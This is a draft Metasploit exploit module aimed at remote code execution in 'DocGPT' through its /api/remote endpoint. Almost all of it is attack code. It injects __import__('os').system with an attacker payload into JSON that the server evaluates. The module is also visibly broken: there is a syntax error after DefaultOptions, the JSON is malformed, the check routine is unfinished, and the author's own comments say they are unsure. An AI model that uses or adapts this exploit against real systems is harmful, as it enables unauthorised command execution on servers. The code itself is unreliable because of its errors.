# TODO: add module comments

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'DocGPT RCE',
        'Description' => %q{
          DocGPT versions 0.12 through 0.81 are vulnerable to a
          command injection vulnerability via the /api/remote endpoint.
          This vulnerability arises because JSON data is passed directly into
          an eval function allowing which allows the arbitrary execution of
          python code.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Shreyas Malhotra', # PoC
          'garnderapp', # msf module
        ],
        'References' => [
          ['URL', 'EXPLOITDB'],
          ['URL', 'Cyber Security Database News'],
          ['URL', 'Github Advisory'],
          ['URL', 'NIST'],
        ],
        'Platform' => ['unix', 'win', 'linux'],
        'Targets' => [ 
        	[
        		'Unix/Linux Command',
        		{
        			'Platform' => ['unix', 'linux'],
        			'Arch' => ARCH_CMD,
        			'Type' => :unix_cmd
        		}
        	],
        	[
        		'Windows Command',
        		{
        			'Platform' => ['windows'],
        			'Arch' => ARCH_CMD,
        			'Type' => :win_cmd
        		}
        	]
        ],
        'Payload' => [], # No idea what to do here either
        'Privileged' => false,
        'DisclosureDate' => '2025-04-09',
        'DefaultOptions' => {
        	'SSL' => true,
        	'RPORT' => 7890 # double check port number for api
        }
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        }
      )
      )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path for DocGPT API', '/']),
        OptString.new('DOCGPT_TARGET_ENDPOINT', [true, 'api endpoint to send request to', '/api/remote'])
      ]
    )
  end

  # Not sure if there are any api/endpoints or other artifacts that give
  # away the version of the application.
  # Is there any way we can determine if the DocGPT server is running on linux or windows
  def check
    # make sure the target is online
    res = send_request_cgi(
    	'method' => 'GET',
    	'uri' => normalize_uri(target_uri.path)
    	)

    return CheckCode::Unknown('Connection Failed') unless res
  end

  def exploit # there is probablly a way to get a randomized user agent

  	target_endpoint = normalize_uri(target_uri.path, datastore['DOCGPT_TARGET_ENDPOINT'])

  	headers = {
  		'Content-Type': 'application/x-www-form-urlencoded'
  	}

  	data = <<-DATA
  	'user=1&source=reddit&name=other&data={
  		"source": "reddit",
  		"client_id": "1337",
  		"user_agent","1337",
  		"search_queries": [""],
  		"number_post": 10,
  		"RCE\\\\":__import__('os').system('#{payload}')}#"11}'
  	}
  	DATA

  	res = send_request_cgi({
  		'method' => 'GET',
  		'uri' => target_endpoint,
  		'headers' => headers,
  		'data' => data
  	})

  	return unless res&.code == 200 && res.body.include?('sucess')

  end

end
